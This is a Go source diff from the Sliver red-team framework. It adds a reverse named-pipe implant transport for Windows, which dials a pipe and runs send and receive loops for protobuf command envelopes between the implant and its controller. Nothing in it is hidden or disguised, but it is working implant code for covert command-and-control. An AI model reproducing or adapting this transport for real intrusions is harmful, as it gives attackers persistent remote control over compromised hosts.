@@ -23,15 +23,18 @@ package transports
 import (
 	"bytes"
 	"encoding/binary"
+	"io"
 	"net"
 	"net/url"
 	"strings"
+	"sync"
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/3rdparty/winio"
 	"github.com/golang/protobuf/proto"
 )
@@ -41,14 +44,60 @@ const (
 	writeBufSizeNamedPipe = 1024
 )
 
-func namePipeDial(uri *url.URL) (net.Conn, error) {
-	address := uri.String()
-	address = strings.ReplaceAll(address, "namedpipe://", "")
-	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
-	// {{if .Config.Debug}}
-	log.Print("Named pipe address: ", address)
-	// {{end}}
-	return winio.DialPipe(address, nil)
+// namedPipeConnect - Reverse Named Pipe implant transport (Windows only)
+func namedPipeConnect(uri *url.URL) (*Connection, error) {
+	conn, err := namePipeDial(uri)
+	if err != nil {
+		return nil, err
+	}
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[namedpipe] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			// {{if .Config.Debug}}
+			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
+			// {{end}}
+			namedPipeWriteEnvelope(&conn, envelope)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			envelope, err := namedPipeReadEnvelope(&conn)
+			if err == io.EOF {
+				break
+			}
+			if err == nil {
+				recv <- envelope
+				// {{if .Config.Debug}}
+				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
+				// {{end}}
+			}
+		}
+	}()
+	activeConnection = connection
+	return connection, nil
 }
 
 func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
@@ -87,6 +136,16 @@ func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 		}
 	}
 	return nil
+}
+
+func namePipeDial(uri *url.URL) (net.Conn, error) {
+	address := uri.String()
+	address = strings.ReplaceAll(address, "namedpipe://", "")
+	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
+	// {{if .Config.Debug}}
+	log.Print("Named pipe address: ", address)
+	// {{end}}
+	return winio.DialPipe(address, nil)
 }
 
 func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
